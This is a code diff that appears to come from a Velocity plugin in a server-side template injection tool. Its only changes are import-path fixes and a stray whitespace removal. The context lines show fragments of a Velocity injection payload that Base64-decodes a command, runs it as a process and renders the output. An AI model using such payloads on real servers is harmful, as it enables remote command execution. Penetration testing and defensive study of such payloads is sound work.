@@ -1,5 +1,5 @@
-from plugins.languages import java
-from utils import rand
+from ..languages import java
+from ...utils import rand
 
 
 class Velocity(java.Java):
@@ -89,7 +89,7 @@ $s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "U
 #set($n=$p.waitFor())\
 #set($o=$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))\
 ${{o}}\
-""" 
+"""
             },
             'execute_error': {
                 'call': 'render',
